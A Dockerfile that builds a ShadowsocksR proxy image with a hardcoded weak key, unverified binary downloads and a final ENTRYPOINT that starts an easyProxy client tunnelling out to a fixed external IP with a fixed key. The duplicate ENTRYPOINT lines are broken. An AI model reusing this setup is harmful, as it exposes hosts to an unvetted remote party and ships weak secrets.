FROM debian:latest

MAINTAINER letssudormrf


#Download applications
RUN apt-get update \
&& apt-get install -y libsodium-dev python git ca-certificates iptables --no-install-recommends



RUN git clone -b akkariiin/master https://github.com/letssudormrf/shadowsocksr.git \
&& cd shadowsocksr \
&& bash initcfg.sh \
&& sed -i 's/sspanelv2/mudbjson/' userapiconfig.py \
&& python mujson_mgr.py -a -u MUDB -p 6082 -k 12345678 -m aes-256-cfb -O origin -o plain

RUN wget https://github.com/cnlh/easyProxy/releases/download/v0.0.9/linux_386_client.tar.gz
RUN tar -xvf linux_386_client.tar.gz




#Execution environment
COPY rinetd_bbr rinetd_bbr_powered rinetd_pcc start.sh proxy_client  /root/
RUN chmod a+x /root/rinetd_bbr /root/rinetd_bbr_powered /root/rinetd_pcc /root/start.sh /root/proxy_client
WORKDIR /shadowsocksr
ENTRYPOINT ["/root/start.sh"]
ENTRYPOINT ["/root/proxy_client","-server=59.32.177.26:7000","-vkey=ikglc9f11ctayqhg","&"]

CMD /root/start.sh